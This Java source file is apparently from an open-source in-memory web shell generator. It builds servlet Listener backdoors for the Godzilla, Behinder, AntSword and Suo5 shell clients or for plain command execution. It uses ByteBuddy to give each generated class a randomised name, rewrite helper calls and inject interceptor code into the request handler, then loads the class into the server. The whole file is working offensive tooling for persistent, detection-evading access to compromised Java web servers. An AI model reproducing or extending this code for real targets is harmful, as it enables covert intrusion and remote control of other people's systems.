package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.buddy.MethodCallReplaceVisitorWrapper;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.shelltool.antsword.AntSwordListener;
import com.reajason.javaweb.memshell.shelltool.behinder.BehinderListener;
import com.reajason.javaweb.memshell.shelltool.command.CommandListener;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaListener;
import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Listener;
import com.reajason.javaweb.memshell.utils.CommonUtil;
import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.asm.AsmVisitorWrapper;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.dynamic.loading.ClassLoadingStrategy;

import java.util.Collections;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2025/2/22
 */
public class ListenerGenerator {

    public static Class<?> generateListenerShellClass(Class<?> implInterceptor, ShellTool shellTool) {
        Class<?> targetClass = null;
        switch (shellTool) {
            case Suo5:
                targetClass = Suo5Listener.class;
                break;
            case Godzilla:
                targetClass = GodzillaListener.class;
                break;
            case Behinder:
                targetClass = BehinderListener.class;
                break;
            case AntSword:
                targetClass = AntSwordListener.class;
                break;
            case Command:
                targetClass = CommandListener.class;
                break;
            default:
                throw new IllegalArgumentException("Unknown shell tool: " + shellTool);
        }
        String newClassName = targetClass.getName() + CommonUtil.getRandomString(5);

        try (DynamicType.Unloaded<?> unloaded = new ByteBuddy()
                .redefine(targetClass)
                .name(newClassName)
                .visit(new AsmVisitorWrapper.ForDeclaredMethods()
                        .method(named("getResponseFromRequest"),
                                new MethodCallReplaceVisitorWrapper(newClassName, Collections.singleton(ShellCommonUtil.class.getName()))))
                .visit(Advice.to(implInterceptor).on(named("getResponseFromRequest")))
                .make()) {
            return unloaded.load(ListenerGenerator.class.getClassLoader(), ClassLoadingStrategy.Default.WRAPPER_PERSISTENT).getLoaded();
        }
    }
}
